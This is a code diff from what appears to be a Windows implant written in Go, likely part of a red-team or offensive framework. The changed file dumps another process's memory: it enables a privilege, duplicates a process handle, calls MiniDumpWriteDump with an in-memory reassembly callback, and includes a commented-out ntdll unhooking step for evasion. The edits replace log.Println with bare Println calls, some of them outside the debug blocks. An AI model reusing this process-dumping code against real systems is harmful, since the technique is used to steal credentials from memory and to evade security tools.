@@ -24,7 +24,6 @@ import (
 	"sync"
 
 	//{{if .Config.Debug}}
-	"log"
 	//{{end}}
 
 	// {{if .Config.Evasion}}
@@ -92,7 +91,7 @@ func (o *outDump) reassemble() []byte {
 	lastChunk, ok := o.chunks.Load(lastChunckOffset)
 	if !ok {
 		// {{if .Config.Debug}}
-		log.Println("lastChunk not found")
+		Println("lastChunk not found")
 		// {{end}}
 		return nil
 	}
@@ -101,7 +100,7 @@ func (o *outDump) reassemble() []byte {
 		chunk, ok := o.chunks.Load(k)
 		if !ok {
 			// {{if .Config.Debug}}
-			log.Printf("chunk %d not found\n", k)
+			Printf("chunk %d not found\n", k)
 			// {{end}}
 			return nil
 		}
@@ -121,20 +120,20 @@ func dumpProcess(pid int32) (ProcessDump, error) {
 		return res, err
 	}
 
-	log.Println("Enabled SePrivilege")
+	Println("Enabled SePrivilege")
 	hProc, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, uint32(pid))
 	currentProcHandle := windows.CurrentProcess()
 	err = windows.DuplicateHandle(hProc, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, windows.DUPLICATE_SAME_ACCESS)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Println("DuplicateHandle failed")
+		Println("DuplicateHandle failed")
 		// {{end}}
 		return res, err
 	}
 
-	log.Println("Duplicate Handled worked")
+	Println("Duplicate Handled worked")
 	if hProc != 0 {
-		log.Println("will start minidump with hproc", hProc)
+		Println("will start minidump with hproc", hProc)
 
 		return minidump(uint32(pid), lpTargetHandle)
 	}
@@ -150,7 +149,7 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	//err = evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
 	if err != nil {
 		//{{if .Config.Debug}}
-		log.Println("RefreshPE failed:", err)
+		Println("RefreshPE failed:", err)
 		//{{end}}
 		return dump, err
 	}
@@ -166,7 +165,7 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
 	}
 
-	log.Println("Will start MiniDump Write")
+	Println("Will start MiniDump Write")
 
 	err = MiniDumpWriteDump(
 		proc,
@@ -182,11 +181,11 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 		return dump, err
 	}
 	// {{if .Config.Debug}}
-	log.Println("Dump completed, reassembling...")
+	Println("Dump completed, reassembling...")
 	// {{end}}
 	dump.data = outData.reassemble()
 	// {{if .Config.Debug}}
-	log.Println("Reassembly done!")
+	Println("Reassembly done!")
 	// {{end}}
 	return dump, nil
 }
@@ -262,12 +261,12 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 	callbackInput, err := getCallbackInput(callbackInputPtr)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("getCallbackInput failed: %s\n", err.Error())
+		Printf("getCallbackInput failed: %s\n", err.Error())
 		// {{end}}
 		return FALSE
 	}
 	// {{if .Config.Debug}}
-	log.Printf("minidumpCallback called: %v\n", callbackInput.CallbackType)
+	Printf("minidumpCallback called: %v\n", callbackInput.CallbackType)
 	// {{end}}
 	switch callbackInput.CallbackType {
 	case IoStartCallback:
